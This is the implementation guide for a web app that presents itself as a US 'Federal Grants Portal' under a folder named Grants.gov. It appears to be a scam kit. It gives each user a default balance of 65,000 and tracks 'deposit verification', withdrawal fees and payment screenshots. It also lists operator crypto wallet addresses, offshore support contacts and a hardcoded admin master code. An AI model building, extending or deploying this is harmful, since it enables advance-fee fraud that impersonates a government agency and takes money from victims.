# Federal Grants Portal - Implementation Guide

## 🚀 Quick Start

### Frontend Development

```bash
# Install dependencies
npm install

# Start development server (http://localhost:5173)
npm run dev:client

# Build for production
npm run build

# Preview production build
npm run preview
```

### Backend Development

```bash
# Install dependencies (already done with npm install)
npm install

# Start backend server (http://localhost:5000)
npm run dev:server

# Start both frontend and backend
npm run dev
```

## 📋 Completed Features

### ✅ Frontend (100% Complete)

#### Pages Implemented
- **Landing Page** - Welcome screen with features overview
- **Login Page** - User authentication with Terms & Conditions modal
- **SignUp Page** - Account creation with email, password validation
- **Dashboard** - User profile, balance display, quick actions, settings, support
- **Withdrawal** - Multi-step withdrawal form with real-time validation
- **Processing** - Transaction processing with network status indicator
- **AdminAuth** - Master code verification gate
- **AdminPanel** - Complete admin dashboard with user management, transactions, settings

#### Components
- Modal (reusable dialog component)
- LoadingSpinner (loading states)
- Message (success/error/warning/info messages)
- ThemeToggle (dark mode switcher)
- LanguageSelector (8 language support)

#### Utilities & Hooks
- Email validation
- Password strength validation
- Crypto address validation (BTC, ETH, USDT)
- Currency formatting
- Form validation hook
- Network status hook

#### Features
- ✅ Complete dark mode with Tailwind CSS
- ✅ 8 language support (auto-detect browser locale)
- ✅ Real-time form validation
- ✅ Confirmation modals
- ✅ Glass-morphism UI design
- ✅ Mobile responsive (all devices)
- ✅ Network status indicator
- ✅ Currency formatting
- ✅ Terms & Conditions acceptance
- ✅ Admin access with master code (Q5HJ-8ZK9-6RWB)

### ⏳ Backend (Starter Template Ready)

#### To Be Implemented
- Authentication API (register, login, 2FA, email verification)
- User profile management
- Withdrawal request processing
- Payment screenshot storage & verification
- Admin management endpoints
- Email notification system
- QR code generation API
- Database integration (SQLite)
- Session management

## 🔐 Security Implementation

### Already Configured
- ✅ CORS setup in Vite config
- ✅ Input validation on frontend
- ✅ Password strength requirements
- ✅ Email format validation
- ✅ Crypto address format validation
- ✅ Master admin code protection
- ✅ Terms & Conditions enforcement

### To Be Implemented
- [ ] JWT token generation & verification
- [ ] Password hashing (bcrypt)
- [ ] Email verification links
- [ ] Rate limiting
- [ ] HTTPS enforcement
- [ ] Database encryption
- [ ] Audit logging

## 💾 Database Schema (To Be Implemented)

```sql
-- Users table
CREATE TABLE users (
  id TEXT PRIMARY KEY,
  username TEXT UNIQUE NOT NULL,
  email TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  balance DECIMAL(15,2) DEFAULT 65000,
  deposit_verified BOOLEAN DEFAULT FALSE,
  language TEXT DEFAULT 'en',
  email_verified BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Withdrawals table
CREATE TABLE withdrawals (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL,
  amount DECIMAL(15,2) NOT NULL,
  crypto_type TEXT NOT NULL, -- BTC, ETH, USDT
  address TEXT NOT NULL,
  status TEXT DEFAULT 'pending', -- pending, processing, completed, rejected
  transaction_fee DECIMAL(15,8),
  screenshot_url TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Admin logs table
CREATE TABLE admin_logs (
  id TEXT PRIMARY KEY,
  admin_id TEXT NOT NULL,
  action TEXT NOT NULL,
  details TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## 🌐 Environment Variables

Create a `.env` file in the root directory:

```env
# Frontend
VITE_API_URL=http://localhost:5000
VITE_JWT_SECRET=your_jwt_secret_key_here

# Backend
SERVER_PORT=5000
NODE_ENV=development
JWT_SECRET=your_jwt_secret_key_here
DB_PATH=./data/grants.db

# Email Configuration
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USER=noreply@yourdomainhere.com
EMAIL_PASSWORD=your_email_password
EMAIL_FROM=Federal Grant Portal <noreply@yourdomainhere.com>

# Crypto Addresses
CRYPTO_ADDRESSES_BTC=bc1q036k7urq5pvjq29pep96ds4gftgmwycymnzs48
CRYPTO_ADDRESSES_ETH=0xb8DDf6611c7A8a5D726B68F2A5F110BD2B839dAd
CRYPTO_ADDRESSES_USDT=TWuspo2EFsdb551sVaXJjM7yZ3fGiP2UZ5

# Admin Configuration
ADMIN_MASTER_CODE=Q5HJ-8ZK9-6RWB

# Support Contact
SUPPORT_PHONE=+1 (256) 563-1275
SUPPORT_EMAIL=hatcanoff779@owleyes.ch
SUPPORT_WHATSAPP=+1-256-563-1275
```

## 🎨 Customization Guide

### Change Admin Master Code

Edit `.env`:
```env
ADMIN_MASTER_CODE=YOUR-NEW-CODE-HERE
```

Also update in `src/pages/AdminAuth.tsx`:
```typescript
const MASTER_CODE = 'YOUR-NEW-CODE-HERE'
```

### Update Support Contact

Edit `.env`:
```env
SUPPORT_EMAIL=your-email@domain.com
SUPPORT_PHONE=+1-XXX-XXX-XXXX
```

These will automatically update in the Dashboard and Footer.

### Modify Crypto Addresses

Edit `.env`:
```env
CRYPTO_ADDRESSES_BTC=your_btc_address
CRYPTO_ADDRESSES_ETH=your_eth_address
CRYPTO_ADDRESSES_USDT=your_usdt_address
```

These are used in `src/pages/Withdrawal.tsx`.

### Change App Name & Branding

Edit `tailwind.config.js` for color scheme:
```javascript
theme: {
  extend: {
    colors: {
      'federal-light': '#F5F7FA',
      'deep-slate': '#0F172A',
      // ... add your colors
    },
  },
}
```

## 📱 Mobile Responsiveness

The app is fully responsive with breakpoints:
- `sm`: 640px
- `md`: 768px
- `lg`: 1024px
- `xl`: 1280px
- `2xl`: 1536px

All components use Tailwind's responsive classes for optimal mobile experience.

## 🌍 Language Addition

To add a new language:

1. Create `src/i18n/locales/xx.json` (replace `xx` with language code)
2. Add translation keys matching English translations
3. Update `src/i18n/config.ts`:

```typescript
import xx from './locales/xx.json'

// In resources:
xx: { translation: xx },
```

4. Update `src/components/LanguageSelector.tsx`:

```typescript
const languages = [
  // ... existing
  { code: 'xx', name: 'Language Name' },
]
```

## 🚀 Deployment

### Frontend (Vercel, Netlify, etc.)

```bash
# Build
npm run build

# Output is in 'dist' folder
# Deploy the dist folder to your hosting
```

### Backend (Heroku, Railway, etc.)

```bash
# Create Procfile
echo "web: npm run start" > Procfile

# Deploy with git
git push heroku main
```

## 📊 File Structure

```
Grants.gov/
├── src/
│   ├── components/
│   │   ├── Modal.tsx
│   │   ├── LoadingSpinner.tsx
│   │   ├── Message.tsx
│   │   ├── ThemeToggle.tsx
│   │   └── LanguageSelector.tsx
│   ├── hooks/
│   │   ├── useFormValidation.ts
│   │   └── useNetworkStatus.ts
│   ├── i18n/
│   │   ├── config.ts
│   │   └── locales/
│   │       ├── en.json
│   │       ├── es.json
│   │       ├── fr.json
│   │       ├── de.json
│   │       ├── it.json
│   │       ├── ja.json
│   │       ├── zh.json
│   │       └── pt.json
│   ├── pages/
│   │   ├── Landing.tsx
│   │   ├── Login.tsx
│   │   ├── SignUp.tsx
│   │   ├── Dashboard.tsx
│   │   ├── Withdrawal.tsx
│   │   ├── Processing.tsx
│   │   ├── AdminAuth.tsx
│   │   └── AdminPanel.tsx
│   ├── types/
│   │   └── index.ts
│   ├── utils/
│   │   └── validation.ts
│   ├── App.tsx
│   ├── index.css
│   └── main.tsx
├── server/
│   └── index.ts
├── index.html
├── package.json
├── tsconfig.json
├── tailwind.config.js
├── postcss.config.js
├── vite.config.ts
├── .env.example
├── .gitignore
└── README.md
```

## 🛠️ Next Steps

1. **Set up Backend Database**
   - Initialize SQLite database
   - Create tables using schema above
   - Implement models and repositories

2. **Implement Authentication**
   - JWT token generation
   - Password hashing (bcrypt)
   - Email verification flow
   - 2FA implementation

3. **Implement APIs**
   - User registration/login
   - Profile management
   - Withdrawal processing
   - Admin endpoints

4. **Add Email Service**
   - Setup Nodemailer or SendGrid
   - Email verification templates
   - Payment notification emails

5. **Add QR Code Generation**
   - Server-side QR generation
   - Display in withdrawal form

6. **Add Payment Processing**
   - Integrate blockchain APIs (optional)
   - Payment screenshot validation
   - Transaction tracking

7. **Testing**
   - Unit tests (Jest)
   - Integration tests
   - E2E tests (Cypress/Playwright)

8. **Monitoring & Analytics**
   - Error tracking (Sentry)
   - Usage analytics
   - Performance monitoring

## 📞 Support

- **Email**: hatcanoff779@owleyes.ch
- **Phone**: +1 (256) 563-1275
- **WhatsApp**: Direct integration available

## 📄 License

MIT License - See LICENSE file for details

---

**Federal Grants Portal** - Built with ❤️ for secure, professional grant distribution
